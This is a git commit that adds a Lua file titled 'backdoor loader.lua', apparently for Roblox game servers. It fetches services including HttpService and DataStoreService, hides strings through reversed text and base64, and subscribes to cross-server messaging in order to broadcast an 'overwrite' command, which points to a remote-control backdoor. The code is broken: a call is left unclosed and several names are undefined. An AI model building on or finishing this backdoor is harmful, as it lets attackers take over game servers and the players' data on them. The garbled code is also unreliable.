9e2c1029851ac8ab8148e3462f7edfc3a962c534
xiynn <117784259+xiynn@users.noreply.github.com>
2025-04-11 19:19:37 -0600

    Create backdoor loader.lua

---
+++ backdoor loader.lua
@@ -0,0 +1,38 @@
+local panel = {
+
+}
+
+local wipe = {
+4407961133;
+}
+
+local ts = {
+
+}
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerStorage = game:GetService("ServerStorage")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local DataStoreService = game:GetService("DataStoreService")
+local HttpService = game:GetService("HttpService")
+
+
+local module = {}
+
+function m:Init() 
+
+
+    local version = HttpService:Decode(HttpService:GetAsync(
+  		local s, c
+		repeat
+			s, c = pcall(function()
+				MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
+			end)
+			task.wait()
+		until
+		s
+		MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
+end
+
+return module
